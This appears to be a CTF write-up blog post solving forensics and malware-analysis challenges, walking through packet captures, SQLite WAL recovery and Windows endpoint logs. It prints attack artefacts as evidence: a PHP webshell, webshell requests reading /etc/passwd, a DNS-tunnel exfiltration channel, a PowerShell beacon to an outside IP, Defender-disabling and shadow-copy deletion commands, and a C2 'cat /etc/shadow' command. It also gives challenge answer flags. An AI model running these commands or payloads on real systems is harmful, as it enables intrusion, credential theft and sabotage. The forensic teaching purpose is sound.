---
layout: post
title:  "Forensics Challenges"
date:   2026-08-17 20:07:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /0xV01D-ctf-2026-forensics/
---
* TOC
{:toc}

## NULLSTAR // BREACH

**Category**: forensics

**Description**: At 02:11 local, the IDS on the NULLSTAR perimeter threw one alert and then nothing. By the time anyone looked, a box was already talking to the outside on its own.

You have a single capture from the victim's segment — capture.pcap. Everything the intruder did to that host is in there, from the first knock to the last thing they smuggled out. Walk it end to end.

Eight answers. They get harder. The last one didn't leave by any door you'd think to watch. Flag for this stage is `0xV01D{1_R34D3D_7H3_D35CR1P710N}`

`0xV01D{1_R34D3D_7H3_D35CR1P710N}`

___

## NULLSTAR // BREACH 1

**Category**: forensics

**Description**: What is the attacker's IP address? Answer format: 0xV0ID{}

I found an http packet where the attacker is blatantly interacting with a webshell. I copied this:
```shell
Internet Protocol Version 4, Src: 10.13.37.101, Dst: 192.168.10.50
```

`0xV0ID{10.13.37.101}`

___

## NULLSTAR // BREACH 2

**Category**: forensics

**Description**: The attacker found more than one port open, but only pursued one of them. Which TCP port did they actually attack? Answer format: 0xV0ID{}

From the attack traffic:
```shell
Transmission Control Protocol, Src Port: 44151, Dst Port: 8080, Seq: 1, Ack: 1, Len: 144
```

They made this request:
```http
GET /uploads/sh3ll.php?cmd=cat%20/etc/passwd HTTP/1.1
Host: 192.168.10.50:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) BruteForcer/2.1
```

Response:
```http
HTTP/1.1 200 OK
Server: 0xV0ID-httpd/0.9
Content-Type: text/plain
Content-Length: 128
Connection: close

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
appsvc:x:1000:1000::/home/appsvc:/bin/bash
```

`0xV0ID{8080}`

___

## NULLSTAR // BREACH 3

**Category**: forensics

**Description**: The attacker got into the admin console by guessing. What password did they finally log in with? Answer format: 0xV0ID{}

This request allowed the attacker to login:
```http
GET /admin/login HTTP/1.1
Host: 192.168.10.50:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) BruteForcer/2.1
Authorization: Basic YWRtaW46UzNjcjN0X1A0c3Mh
```

Decode the creds they used:
```shell
echo 'YWRtaW46UzNjcjN0X1A0c3Mh' | base64 -d  
admin:S3cr3t_P4ss!
```

`0xV0ID{S3cr3t_P4ss!}`

___

## NULLSTAR // BREACH 4

**Category**: forensics

**Description**: Once inside, they planted something. What is the filename of the tool they uploaded to the server? Answer format: 0xV0ID{}

They uploaded a webshell:
```http
POST /admin/upload.php HTTP/1.1
Host: 192.168.10.50:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) BruteForcer/2.1
Authorization: Basic YWRtaW46UzNjcjN0X1A0c3Mh
Content-Type: multipart/form-data; boundary=----0xV0IDBoundary7MA4YWxk
Content-Length: 196

------0xV0IDBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="sh3ll.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------0xV0IDBoundary7MA4YWxk--
```

`0xV0ID{sh3ll.php}`

___

## NULLSTAR // BREACH 5

**Category**: forensics

**Description**: They went digging through the filesystem. What is the name of the protected file they found in root's home directory? Answer format: 0xV0ID{}

Request:
```http
GET /uploads/sh3ll.php?cmd=ls%20-la%20/root HTTP/1.1
Host: 192.168.10.50:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) BruteForcer/2.1
```

Response:
```http
HTTP/1.1 200 OK
Server: 0xV0ID-httpd/0.9
Content-Type: text/plain
Content-Length: 153
Connection: close

total 24
drwx------ 2 root root 4096 Apr 11 02:14 .
drwxr-xr-x 18 root root 4096 Apr 10 22:00 ..
-rw------- 1 root root 8192 Apr 11 02:13 secrets.kdbx
```

`0xV0ID{secrets.kdbx}`

___

## NULLSTAR // BREACH 6

**Category**: forensics

**Description**: At one point the attacker dumped an application config. It doesn't look like much on the wire — but decode it and it gives up a secret key. What is it? Answer format: 0xV0ID{}

Request:
```http
GET /uploads/sh3ll.php?cmd=base64%20/opt/app/config.php HTTP/1.1
Host: 192.168.10.50:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) BruteForcer/2.1
```

Response:
```http
HTTP/1.1 200 OK
Server: 0xV0ID-httpd/0.9
Content-Type: text/plain
Content-Length: 189
Connection: close

PD9waHAKJERCX0hPU1Q9JzEyNy4wLjAuMSc7CiREQl9VU0VSPSdhcHBzdmMnOwokREJfUEFTUz0nVmF1MXRfSzN5XzlmM2EnOwokREJfTkFNRT0nMHh2MGlkX2FwcCc7Ci8vIFRPRE86IHJvdGF0ZSB2YXVsdCBrZXkgYmVmb3JlIGF1ZGl0Cj8+Cg==
```

```shell
echo "PD9waHAKJERCX0hPU1Q9JzEyNy4wLjAuMSc7CiREQl9VU0VSPSdhcHBzdmMnOwokREJfUEFTUz0nVmF1MXRfSzN5XzlmM2EnOwokREJfTkFNRT0nMHh2MGlkX2FwcCc7Ci8vIFRPRE86IHJvdGF0ZSB2YXVsdCBrZXkgYmVmb3JlIGF1ZGl0Cj8+Cg==" | base64 -d  
<?php  
$DB_HOST='127.0.0.1';  
$DB_USER='appsvc';  
$DB_PASS='Vau1t_K3y_9f3a';  
$DB_NAME='0xv0id_app';  
// TODO: rotate vault key before audit  
?>
```

`0xV0ID{Vau1t_K3y_9f3a}`

___

## NULLSTAR // BREACH 7

**Category**: forensics

**Description**: Shortly after, the victim started making a lot of very strange name lookups. What domain was the data being leaked to? Answer format: 0xV0ID{}

```shell
tshark -r capture.pcap -Y "dns" -T fields -e frame.time -e ip.src -e ip.dst -e dns.qry.name -e dns.resp.name -e dns.flags -e dns.count.queries -e dns.count.answers -e dns.resp.type

... etc ...

Nov 14, 2023 17:13:21.836242000 EST     192.168.10.50   192.168.10.1    00mnftkqt2.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.843345000 EST     192.168.10.1    192.168.10.50   00mnftkqt2.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.853009000 EST     192.168.10.50   192.168.10.1    01gasdgbaf.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.855227000 EST     192.168.10.1    192.168.10.50   01gasdgbaf.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.872313000 EST     192.168.10.50   192.168.10.1    02ibjwi3bh.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.880042000 EST     192.168.10.1    192.168.10.50   02ibjwi3bh.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.888112000 EST     192.168.10.50   192.168.10.1    03hqdcwpby.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.906905000 EST     192.168.10.1    192.168.10.50   03hqdcwpby.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.908842000 EST     192.168.10.50   192.168.10.1    04aaor2er7.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.927562000 EST     192.168.10.1    192.168.10.50   04aaor2er7.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.946765000 EST     192.168.10.50   192.168.10.1    05nqiucb2b.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.958359000 EST     192.168.10.1    192.168.10.50   05nqiucb2b.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.962153000 EST     192.168.10.50   192.168.10.1    06njrvsei7.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.979185000 EST     192.168.10.1    192.168.10.50   06njrvsei7.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.985733000 EST     192.168.10.50   192.168.10.1    07ci3wyl2d.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.987276000 EST     192.168.10.1    192.168.10.50   07ci3wyl2d.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:21.988322000 EST     192.168.10.50   192.168.10.1    08lbdqazdl.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:21.990208000 EST     192.168.10.1    192.168.10.50   08lbdqazdl.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:22.006756000 EST     192.168.10.50   192.168.10.1    09gqnrcich.t.0xv0id-c2.net              0x0100  1       0  
Nov 14, 2023 17:13:22.022933000 EST     192.168.10.1    192.168.10.50   09gqnrcich.t.0xv0id-c2.net              0x8183  1       0  
Nov 14, 2023 17:13:22.031359000 EST     192.168.10.50   192.168.10.1    0ady.t.0xv0id-c2.net            0x0100  1       0  
Nov 14, 2023 17:13:22.032390000 EST     192.168.10.1    192.168.10.50   0ady.t.0xv0id-c2.net            0x8183  1       0
```

`0xV0ID{t.0xv0id-c2.net}`

___

## NULLSTAR // BREACH 8

**Category**: forensics

**Description**: Put it together. The intruder's real prize left the network the same quiet way those strange lookups did — scattered, wrapped, and locked with something you already recovered earlier in this capture. Reassemble it and read the message. The flag is the decoded message itself.

I needed to reassemble the sections (`00-09`) from the dns queries. I thought it was base64, but it turned out to be base32. Then it needed XORed with the key `S3cr3t_P4ss!`:
```python
python3  
Python 3.13.5 (main, Jul 15 2026, 20:25:40) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import base64  
...  
... # reassembled base32 payload from dns queries  
... b32_payload = "MNFTKQT2GASDGBAFIBJWI3BHHQDCWPBYAAOR2ER7NQIUCB2BNJRVSEI7CI3WYL2DLBDQAZDLGQNRCICHDY======"  
...  
... # decode base32  
... encrypted_bytes = base64.b32decode(b32_payload)  
...  
... # xor key  
... key = b"S3cr3t_P4ss!"  
...  
... decrypted = bytearray()  
... for i in range(len(encrypted_bytes)):  
...     decrypted.append(encrypted_bytes[i] ^ key[i % len(key)])  
...  
... print(f"Flag: {decrypted.decode(errors='ignore')}")  
...  
Flag: 0xV0ID{c0v3r7_DN5_ch4nn3l_r34553mbl3d_L1k3_4_Gh0st}
```

`0xV0ID{c0v3r7_DN5_ch4nn3l_r34553mbl3d_L1k3_4_Gh0st}`

___

## Echoes in the WAL

**Category**: forensics

**Description**: At 21:03 a field phone received a notification confirming an encrypted attachment was ready. Seconds later the attachment was replaced and a remote deletion policy ran. The current database says everything is gone, but the evidence collector captured the app files while it was active. Recover the attachment that was valid **at the exact notification time**, then extract the flag.

- Preserve the originals; some SQLite tools change directory state when opened.
- The phone timezone is documented in the package.
- No password guessing or brute force is required.
- Every fact required to decrypt the attachment is inside the evidence set.

I get the challenge files:
```shell
unzip night-shift-phone-export.zip  
Archive:  night-shift-phone-export.zip  
  inflating: app_config.json  
  inflating: collection_manifest.json  
  inflating: device.xml  
  inflating: nightjar.db  
  inflating: nightjar.db-wal  
  inflating: notification_history.log
```

Looking at the files:
```shell
file *  
app_config.json:          JSON text data  
collection_manifest.json: JSON text data  
device.xml:               XML 1.0 document, ASCII text, with CRLF line terminators  
nightjar.db:              SQLite 3.x database, last written using SQLite version 3049001, writer version 2, read version 2, file counter 2, database pages 6, cookie 0x4, schema 4, UTF-8, version-valid-for 2  
nightjar.db-wal:          SQLite Write-Ahead Log, version 3007000  
notification_history.log: ASCII text, with CRLF line terminators
```

```shell
cat app_config.json
{
  "package": "io.void.nightjar",
  "journal_mode": "WAL",
  "attachment_cipher": "AES-256-GCM",
  "key_material_utf8": "android_id:thread_id:revision:committed_ms",
  "key_digest": "SHA-256",
  "aad_utf8": "thread=<thread_id>;revision=<revision>",
  "nonce_storage": "attachments.nonce"
}
```

```shell
cat collection_manifest.json
{
  "app_config.json": {
    "sha256": "8b1fff0079564e74048d33e3ad330d02561e2d11c2e6f0b038d6f1633146df15",
    "size": 300
  },
  "device.xml": {
    "sha256": "66f2f3829a1c72cf4a487c0dcea25c6287acc45692dcd0af531f91fffe29250e",
    "size": 260
  },
  "nightjar.db": {
    "sha256": "911d5213f37a10c2b302486025d69669592a4b20f4639c8535834b0ece2e0300",
    "size": 24576
  },
  "nightjar.db-wal": {
    "sha256": "1d7d9210487114c64986867468eef7846f1b001414b920235c56185354b88183",
    "size": 98912
  },
  "notification_history.log": {
    "sha256": "7ca7ab0fd80d3961f20ec0a731b966d65a239d194ecc3becb59446157d31f2d5",
    "size": 377
  }
}
```

```shell
cat device.xml
<?xml version="1.0" encoding="utf-8"?>
        <device>
          <setting name="android_id" value="a91f32d06c74be18" />
          <setting name="timezone" value="Asia/Amman" />
          <setting name="clock_source" value="network" />
        </device>
```

```shell
cat notification_history.log
2026-07-14T21:03:08.107+03:00 Nightjar/Sync: staging encrypted attachment [thread=17]
        2026-07-14T21:03:11.842+03:00 Nightjar/Sync: attachment ready [thread=17 revision=4 tx=47]
        2026-07-14T21:03:14.942+03:00 Nightjar/Policy: remote replacement received [thread=17]
        2026-07-14T21:03:19.442+03:00 Nightjar/Policy: retention purge completed [thread=17]
```

I looked around on the internet for info about `.db-wal` files. I found that sqlite uses Write-Ahead Logs (`-wal` files) to store recent changes before they are checkpointed into the main database file. 

In this situation I know that a remote wipe command was sent shortly after receiving the file. The transactions that deleted the attachment would have been appended to the very end of the WAL file.

If you try to open the database normally (using `sqlite3` or something) sqlite will automatically replay the entire WAL file to bring the database to its latest state, and the evidence will be lost.

This can be avoided by copying the database and cutting off the end of the WAL file frame by frame. This will chop off the newer deletion transations. Then it will force sqlite to recover the database state to exactly when the attachment was sitting decrypted in the staging area.

I ran this python:
```python
import sqlite3
import shutil
import os
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ANDROID_ID = "a91f32d06c74be18"
THREAD_ID = 17
REVISION = 4

def solve():
    wal_file = 'nightjar.db-wal'
    db_file = 'nightjar.db'
    
    if not os.path.exists(wal_file):
        print("Cant find .db and .db-wal files.")
        return
        
    # WAL files have a 32 byte header followed by frames
    # standard db page size is 4096 bytes + 24 byte frame header = 4120
    frame_size = 4120
    header_size = 32
    
    wal_size = os.path.getsize(wal_file)
    num_frames = (wal_size - header_size) // frame_size
    print(f"Total WAL frames detected: {num_frames}")
    
    # iterate backwards to find the state just before deletion
    for i in range(num_frames, 0, -1):
        # create a disposable snapshot up to frame 'i'
        shutil.copy(db_file, 'temp.db')
        with open(wal_file, 'rb') as f:
            wal_data = f.read(header_size + i * frame_size)
            
        with open('temp.db-wal', 'wb') as f:
            f.write(wal_data)
            
        try:
            # let sqlite automatically recover the DB to this exact point in time
            conn = sqlite3.connect('temp.db')
            cursor = conn.cursor()
            cursor.execute("""
                SELECT committed_ms, state, nonce, payload 
                FROM attachments 
                WHERE thread_id=? AND revision=?
            """, (THREAD_ID, REVISION))
            row = cursor.fetchone()
            conn.close()
            
            if row:
                committed_ms, state, nonce, payload = row
                
                # check if this frame has the attachment before it was purged
                if state not in ('purged', 'replaced') and payload:
                    print(f"Recovered valid database state at WAL frame {i}!")
                    print(f"    State: {state}")
                    print(f"    Committed MS: {committed_ms}")
                    
                    # derive AES key
                    key_material = f"{ANDROID_ID}:{THREAD_ID}:{REVISION}:{committed_ms}"
                    key = hashlib.sha256(key_material.encode('utf-8')).digest()
                    
                    # setup AAD
                    aad = f"thread={THREAD_ID};revision={REVISION}".encode('utf-8')
                    
                    # decrypt
                    aesgcm = AESGCM(key)
                    try:
                        decrypted = aesgcm.decrypt(nonce, payload, aad)
                        print("\nFlag:")
                        print(decrypted.decode('utf-8', errors='ignore'))
                        
                        # cleanup temp files
                        for f in ['temp.db', 'temp.db-wal', 'temp.db-shm']:
                            if os.path.exists(f): os.remove(f)
                        return
                    except Exception as e:
                        print(f"Decryption failed dummy: {e}")
        except Exception:
            # ignoring generic SQLite errors when iterating through half written states
            pass
            
    print("no valid payload.")

if __name__ == "__main__":
    solve()
```

The output was a zip file but I just grepped for the flag:
```shell
python3 decrypt-phone-thing.py | grep -a -i "0xV01D{"  
Flag: 0xV01D{the_wal_keeps_old_promises}
```

`0xV01D{the_wal_keeps_old_promises}`

___

## BlackOut - 1

**Category**: forensics

**Description**: Identify the compromised user, affected workstation, and first payload. 
Submit format: `0xV01D{user_workstation_payload}`

I get the challenge files:
```shell
unzip 0xV01D_Blackout_player.zip  
Archive:  0xV01D_Blackout_player.zip  
  inflating: 0xV01D_Blackout/CASE_BRIEF.txt  
  inflating: 0xV01D_Blackout/STAGE_PROMPTS.txt  
  inflating: 0xV01D_Blackout/evidence/Malware/oxide_loader.config.enc  
  inflating: 0xV01D_Blackout/evidence/Malware/svch0st.exe.inert  
  inflating: 0xV01D_Blackout/evidence/Memory/NOVA-FIN-044_strings.bin  
  inflating: 0xV01D_Blackout/evidence/Network/relay_stream_8080.bin  
  inflating: 0xV01D_Blackout/evidence/Registry/HKCU-Software-Classes-CLSID.reg  
  inflating: 0xV01D_Blackout/evidence/Network/Zeek/conn.log.csv  
  inflating: 0xV01D_Blackout/evidence/Network/Zeek/dns.log.csv  
  inflating: 0xV01D_Blackout/evidence/Network/Zeek/http.log.csv  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/$MFT.csv  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/$Extend/$UsnJrnl_$J.csv  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/Windows/Prefetch/MSHTA.EXE-42F01D2A.pf.txt  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/Windows/Prefetch/POWERSHELL.EXE-501A2C7E.pf.txt  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/Windows/Prefetch/SVCH0ST.EXE-CA11B0AD.pf.txt  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/Windows/Prefetch/VSSADMIN.EXE-9130FD88.pf.txt  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/Windows/AppCompat/Programs/Amcache_ProgramEntries.csv  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/Users/Public/RECOVER-0xV01D.txt  
  inflating: 0xV01D_Blackout/evidence/KAPE/C/ProgramData/Microsoft/Windows Defender/Support/MPLog-08142026.log  
  inflating: 0xV01D_Blackout/evidence/Endpoint/PowerShell/WindowsPowerShell_Operational.evtx.xml  
  inflating: 0xV01D_Blackout/evidence/Endpoint/Security/Security_4688.csv  
  inflating: 0xV01D_Blackout/evidence/Endpoint/Sysmon/Microsoft-Windows-Sysmon_Operational.evtx.xml
```

I found the payload and user here:
```shell
cat "evidence/KAPE/C/\$Extend/\$UsnJrnl_\$J.csv"  
Time,Reason,Name,Parent  
2026-08-14T18:08:42.000Z,FILE_CREATE,invoice_0814.lnk,C:\Users\nova0x\Downloads  
2026-08-14T18:10:01.000Z,RENAME_NEW_NAME,svch0st.exe,C:\ProgramData\NVIDIA Corporation\nvtelemetry  
2026-08-14T18:11:16.000Z,DATA_EXTEND,RECOVER-0xV01D.txt,C:\Users\Public
```

I found the workstation here:
```shell
grep -R "NOVA-FIN-044"  
CASE_BRIEF.txt:Host: NOVA-FIN-044  
grep: evidence/Memory/NOVA-FIN-044_strings.bin: binary file matches  
evidence/Network/Zeek/http.log.csv:2026-08-14T18:09:40.000Z,CVo1d01,198.51.100.42,/register,POST,Mozilla/5.0 UpdateClient,49,91,NOVA-FIN-044|aws_afaneh,7f4d9b2c-a9e1-4a71-bd44  
-70b2f4d0c661,  
evidence/Endpoint/PowerShell/WindowsPowerShell_Operational.evtx.xml:    <Computer>NOVA-FIN-044.thryve.local</Computer>  
evidence/Endpoint/PowerShell/WindowsPowerShell_Operational.evtx.xml:    <Computer>NOVA-FIN-044.thryve.local</Computer>  
evidence/Endpoint/PowerShell/WindowsPowerShell_Operational.evtx.xml:    <Data Name="ScriptBlockText">$sid='7f4d9b2c-a9e1-4a71-bd44-70b2f4d0c661'; $dev='NOVA-FIN-044|aws_afaneh  
'; Invoke-WebRequest http://198.51.100.42:8080/register -Headers @{'X-Device-ID'=$dev}</Data>  
evidence/Endpoint/PowerShell/WindowsPowerShell_Operational.evtx.xml:    <Computer>NOVA-FIN-044.thryve.local</Computer>  
evidence/Endpoint/Sysmon/Microsoft-Windows-Sysmon_Operational.evtx.xml:    <Computer>NOVA-FIN-044.thryve.local</Computer>

... etc ...
```

`0xV01D{nova0x_NOVA-FIN-044_invoice_0814.lnk}`

___

## BlackOut - 2

**Category**: forensics

**Description**: Identify the defense evasion command and the recovery removal command.
Submit format: `0xV01D{defender_command_shadow_command}`

I found this:
```shell
grep -R "Set"  
evidence/Endpoint/PowerShell/WindowsPowerShell_Operational.evtx.xml:    <Data Name="ScriptBlockText">Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $  
true</Data>  
evidence/Endpoint/Sysmon/Microsoft-Windows-Sysmon_Operational.evtx.xml:    <Data Name="CommandLine">Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $t  
rue</Data>  

grep -R "vssadmin"  
evidence/Endpoint/Security/Security_4688.csv:2026-08-14T18:11:16.000Z,C:\Windows\System32\vssadmin.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,nova0x,vssadmin delete shadows /all /quiet  
evidence/Endpoint/Sysmon/Microsoft-Windows-Sysmon_Operational.evtx.xml:    <Data Name="Image">C:\Windows\System32\vssadmin.exe</Data>  
evidence/Endpoint/Sysmon/Microsoft-Windows-Sysmon_Operational.evtx.xml:    <Data Name="CommandLine">vssadmin delete shadows /all /quiet</Data>
```

`0xV01D{Set-MpPreference_vssadmin_delete_shadows}`

___

## BlackOut - 3

**Category**: forensics

**Description**: Recover the campaign value hidden in DNS TXT records.
Submit format: `0xV01D{campaign_value}`

```shell
cat evidence/Network/Zeek/dns.log.csv  
ts,uid,id.orig_h,query,qtype_name,answers  
2026-08-14T18:09:50.000Z,D1,10.20.44.17,_0.k984.voidcdn.net,TXT,v=spf1 include:dm9pZC1vcHMv -all  
2026-08-14T18:09:52.000Z,D2,10.20.44.17,_1.k984.voidcdn.net,TXT,v=spf1 include:YXVndXN0LXJl -all  
2026-08-14T18:09:54.000Z,D3,10.20.44.17,_2.k984.voidcdn.net,TXT,v=spf1 include:ZA== -all  

echo 'dm9pZC1vcHMvYXVndXN0LXJlZA==' | base64 -d  
void-ops/august-red
```

`0xV01D{void-ops_august-red}`

___

## PHANTOM

**Category**: Malware Analysis

**Description**: A suspicious binary was found on a compromised Linux server. Before anything else — hash it. Submit the MD5 of the file as your flag.

```shell
file malware  
malware: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d4ae1a258f4f185842eb65a8877b5a137a  
1bf426, for GNU/Linux 3.2.0, stripped  

md5sum malware  
0194e72a0452abdcb7a0d7379bb59e35  malware
```

`0194e72a0452abdcb7a0d7379bb59e35`

___

## PHANTOM 1

**Category**: Malware Analysis

**Description**: Same binary. Different hash. Submit the SHA256 of the file as your flag.

```shell
sha256sum malware  
2b6c969cf230ab99e3fcac492013477c33b26d7c807ec3b097c7c8d614ac967d  malware
```

`2b6c969cf230ab99e3fcac492013477c33b26d7c807ec3b097c7c8d614ac967d`

___

## PHANTOM 2

**Category**: Malware Analysis

**Description**: Look at .data - XOR key is 0x55. What is the agent codename?

```shell
objdump -s -j .data malware  
  
malware:     file format elf64-x86-64  
  
Contents of section .data:  
 40a0 00000000 00000000 a8400000 00000000  .........@......  
 40b0 051d141b 011a1800 646d607b 6767657b  ........dm`{gge{  
 40c0 6465647b 61620000 7a696e7b 7a1a2630  ded{ab..zin{z.&0  
 40d0 26210000 00000000 7a696e7b 7a193938  &!......zin{z.98  
 40e0 3e000000 5c110000 3a3a3a3a e29b6ae2  >...\...::::..j.  
 40f0 9b5569                               .Ui
```

XOR with key `0x55`: [cyberchef link](https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x55'%7D,'Standard',false)&input=MDUxZDE0MWIgMDExYTE4MDAgNjQ2ZDYwN2IgNjc2NzY1N2IKNjQ2NTY0N2IgNjE2MjAwMDAgN2E2OTZlN2IgN2ExYTI2MzAKMjYyMTAwMDAgMDAwMDAwMDAgN2E2OTZlN2IgN2ExOTM5MzggCjNlMDAwMDAwIDVjMTEwMDAwIDNhM2EzYTNhIGUyOWI2YWUyCjliNTU2OSA)

`PHANTOM`

___

## PHANTOM 3

**Category**: Malware Analysis

**Description**: Decode the XOR'd bytes in .data — what is the C2 IP?

Found in the cyberchef link for PHANTOM 2.

`185.220.101.47`

___

## PHANTOM 4

**Category**: Malware Analysis

**Description**: Follow the TCP stream in PHANTOM.pcap — decode the beacon payload (XOR key: 0x55). What is the PID?

I get this file:
```shell
file PHANTOM.pcap  
PHANTOM.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Raw IPv4, capture length 65535)
```

There was one tcp stream containing this:
```shell
00000000 14 12 10 1b 01 68 05 1d 14 1b 01 1a 18 5f 05 1c .....h.. ....._..
00000010 11 68 64 66 66 62 5f 00 1c 11 68 65 5f .hdffb_. ..he_
00000000 59 32 46 30 49 43 39 6c 64 47 4d 76 63 32 68 68 Y2F0IC9l dGMvc2hh
00000010 5a 47 39 33 ZG93
```

I put this into cyberchef and XORed with `0x55`:
```shell
14 12 10 1b 01 68 05 1d  14 1b 01 1a 18 5f 05 1c  
11 68 64 66 66 62 5f 00  1c 11 68 65 5f         
```

Output:
```shell
AGENT=PHANTOM
PID=1337
ID=0
```

[cyberchef link](https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x55'%7D,'Standard',true)&input=MTQgMTIgMTAgMWIgMDEgNjggMDUgMWQgIDE0IDFiIDAxIDFhIDE4IDVmIDA1IDFjICAKMTEgNjggNjQgNjYgNjYgNjIgNWYgMDAgIDFjIDExIDY4IDY1IDVmICAgICAgICAg)

`1337`

___

## PHANTOM 5

**Category**: Malware Analysis

**Description**: The C2 server responded with a base64 encoded command. Decode it. What command was sent?

The base64 is in the same tcp stream needed in PHANTOM 4:
```shell
echo 'Y2F0IC9ldGMvc2hhZG93' | base64 -d  
cat /etc/shadow
```

`cat /etc/shadow`
